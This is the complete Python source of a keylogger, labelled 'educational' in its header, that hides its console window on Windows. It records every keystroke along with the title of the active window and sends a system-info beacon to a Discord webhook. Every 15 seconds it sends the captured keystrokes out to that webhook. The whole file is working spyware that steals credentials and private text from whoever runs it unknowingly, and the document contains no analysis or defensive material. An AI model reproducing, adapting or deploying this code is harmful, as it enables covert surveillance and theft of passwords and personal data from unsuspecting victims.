"""
╔══════════════════════════════════════════════════════════════╗
║  KEYLOGGER w/ DISCORD WEBHOOK C2                            ║
║  Author: Zaid                                          ║
║  Purpose: Educational / Cyber Security Research              ║
║  C2 Channel: Discord Webhook                                 ║
║  Features: Stealth Mode, Window Title Tracking               ║
╚══════════════════════════════════════════════════════════════╝
"""

import threading
import requests
import datetime
import socket
import os
import sys
import ctypes
from pynput import keyboard


# ============================================================
# CONFIG
# ============================================================
DISCORD_WEBHOOK_URL = "Your Discord Webhook URL"
SEND_INTERVAL = 15
MAX_MESSAGE_LENGTH = 1900
LOG_FILE = "keylog_debug.txt"
STEALTH_MODE = True  # set to False if you want the console visible


# ============================================================
# GLOBALS
# ============================================================
keystroke_buffer = []
buffer_lock = threading.Lock()
key_count = 0
current_window = ""  # tracks the active window title


# ============================================================
# STEALTH — hides the console window completely
# ============================================================
def go_stealth():
    """
    Vanish the console window. Uses Windows API directly.
    GetConsoleWindow() grabs our console handle,
    ShowWindow(hwnd, 0) hides it (SW_HIDE = 0).
    """
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
            return True
    except Exception:
        pass
    return False


# ============================================================
# WINDOW TITLE TRACKING — knows WHERE keys are being typed
# ============================================================
def get_active_window_title():
    """
    Grab the title of whatever window is currently in focus.
    Uses user32.dll GetForegroundWindow + GetWindowTextW.
    """
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        if length > 0:
            buf = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
            return buf.value
    except Exception:
        pass
    return "Unknown Window"


# ============================================================
# DEBUG LOGGER — writes to file (silent in stealth mode)
# ============================================================
def debug_log(msg):
    """Log to file always. Print to console only if NOT in stealth mode."""
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    line = f"[{timestamp}] {msg}"

    if not STEALTH_MODE:
        print(line, flush=True)

    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except Exception:
        pass


# ============================================================
# SPECIAL KEY MAPPING
# ============================================================
SPECIAL_KEYS = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "\n[ENTER]\n",
    keyboard.Key.tab: "\t[TAB]",
    keyboard.Key.backspace: "[BKSP]",
    keyboard.Key.shift: "",
    keyboard.Key.shift_r: "",
    keyboard.Key.ctrl_l: "[CTRL]",
    keyboard.Key.ctrl_r: "[CTRL]",
    keyboard.Key.alt_l: "[ALT]",
    keyboard.Key.alt_r: "[ALT]",
    keyboard.Key.caps_lock: "[CAPS]",
    keyboard.Key.esc: "[ESC]",
    keyboard.Key.delete: "[DEL]",
    keyboard.Key.up: "[UP]",
    keyboard.Key.down: "[DOWN]",
    keyboard.Key.left: "[LEFT]",
    keyboard.Key.right: "[RIGHT]",
}


def get_system_info():
    """Grab basic system info for the initial beacon."""
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        username = os.getlogin()
        return f"**Hostname:** {hostname}\n**IP:** {ip}\n**User:** {username}"
    except Exception as e:
        return f"**System info:** Error - {e}"


def send_to_discord(payload):
    """Send payload to Discord with full error reporting."""
    try:
        resp = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=15)
        if resp.status_code in (200, 204):
            debug_log(f"  [DISCORD] Sent OK (status {resp.status_code})")
            return True
        else:
            debug_log(f"  [DISCORD] FAILED! Status={resp.status_code}, Body={resp.text[:200]}")
            return False
    except requests.exceptions.ConnectionError as e:
        debug_log(f"  [DISCORD] CONNECTION ERROR: {e}")
        return False
    except requests.exceptions.Timeout:
        debug_log(f"  [DISCORD] TIMEOUT!")
        return False
    except Exception as e:
        debug_log(f"  [DISCORD] UNEXPECTED ERROR: {type(e).__name__}: {e}")
        return False


def send_beacon():
    """Send initial check-in to Discord with system info."""
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    sys_info = get_system_info()

    stealth_status = "🟢 STEALTH ON" if STEALTH_MODE else "🔴 VISIBLE"

    payload = {
        "embeds": [{
            "title": "🔴 Keylogger Online",
            "description": (
                f"Logger activated and listening.\n\n"
                f"{sys_info}\n"
                f"**Mode:** {stealth_status}\n"
                f"**Window Tracking:** Enabled\n"
                f"**Exfil Interval:** {SEND_INTERVAL}s"
            ),
            "color": 0xFF0000,
            "footer": {"text": f"Beacon sent at {now}"},
        }]
    }

    debug_log("Sending beacon to Discord...")
    return send_to_discord(payload)


def send_keystrokes():
    """Flush the keystroke buffer and ship it to Discord."""
    global keystroke_buffer

    with buffer_lock:
        if not keystroke_buffer:
            debug_log(f"Timer fired — buffer empty. (Total keys: {key_count})")
            timer = threading.Timer(SEND_INTERVAL, send_keystrokes)
            timer.daemon = True
            timer.start()
            return

        captured = "".join(keystroke_buffer)
        count = len(keystroke_buffer)
        keystroke_buffer = []

    debug_log(f"Timer fired — sending {count} keystrokes ({len(captured)} chars)...")

    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # save to local backup
    try:
        with open("keylog_captured.txt", "a", encoding="utf-8") as f:
            f.write(f"\n--- {now} ---\n{captured}\n")
        debug_log("  [LOCAL] Saved to keylog_captured.txt")
    except Exception as e:
        debug_log(f"  [LOCAL] Save failed: {e}")

    # chunk and send
    chunks = [captured[i:i + MAX_MESSAGE_LENGTH]
              for i in range(0, len(captured), MAX_MESSAGE_LENGTH)]

    for i, chunk in enumerate(chunks):
        payload = {
            "embeds": [{
                "title": f"⌨️ Keystrokes Captured ({i+1}/{len(chunks)})",
                "description": f"```\n{chunk}\n```",
                "color": 0x00FF00,
                "footer": {"text": f"Captured at {now} | {count} keys"},
            }]
        }
        send_to_discord(payload)

    # reschedule
    timer = threading.Timer(SEND_INTERVAL, send_keystrokes)
    timer.daemon = True
    timer.start()


def on_press(key):
    """Capture each keystroke with window context."""
    global key_count, current_window

    # check what window the user is typing in
    active_window = get_active_window_title()

    with buffer_lock:
        key_count += 1

        # if the user switched windows, log the new window title
        if active_window != current_window:
            current_window = active_window
            keystroke_buffer.append(f"\n\n═══[ {current_window} ]═══\n")
            debug_log(f"  Window switched → {current_window}")

        # capture the actual key
        if key in SPECIAL_KEYS:
            keystroke_buffer.append(SPECIAL_KEYS[key])
        elif hasattr(key, 'char') and key.char is not None:
            keystroke_buffer.append(key.char)
        else:
            keystroke_buffer.append(f"[{key}]")

    if key_count % 10 == 1:
        debug_log(f"  KEY #{key_count} captured (buffer: {len(keystroke_buffer)})")


def main():
    """Fire it up."""
    debug_log("=" * 50)
    debug_log("KEYLOGGER STARTING")
    debug_log(f"Python: {sys.version}")
    debug_log(f"Stealth: {'ON' if STEALTH_MODE else 'OFF'}")
    debug_log(f"Window Tracking: ON")
    debug_log(f"Interval: {SEND_INTERVAL}s")
    debug_log("=" * 50)

    # engage stealth mode — hide console window
    if STEALTH_MODE:
        if go_stealth():
            debug_log("✓ Console window HIDDEN — stealth mode active")
        else:
            debug_log("✗ Could not hide console (non-fatal)")
    else:
        debug_log("Stealth mode OFF — console visible")
        debug_log(">>> TYPE SOMETHING TO TEST <<<")

    # send beacon
    beacon_ok = send_beacon()
    if beacon_ok:
        debug_log("✓ Beacon delivered to Discord!")
    else:
        debug_log("✗ Beacon FAILED — check webhook URL or internet")

    # start exfil timer
    timer = threading.Timer(SEND_INTERVAL, send_keystrokes)
    timer.daemon = True
    timer.start()
    debug_log(f"✓ Exfil timer started ({SEND_INTERVAL}s)")

    # start keyboard listener
    debug_log("Starting keyboard listener...")

    try:
        with keyboard.Listener(on_press=on_press) as listener:
            debug_log("✓ Keyboard listener ACTIVE — capturing with window tracking")
            listener.join()
    except KeyboardInterrupt:
        debug_log("\nStopping... flushing remaining buffer")
        send_keystrokes()
        debug_log("Done. Goodbye!")
    except Exception as e:
        debug_log(f"✗ LISTENER CRASHED: {type(e).__name__}: {e}")


if __name__ == "__main__":
    main()
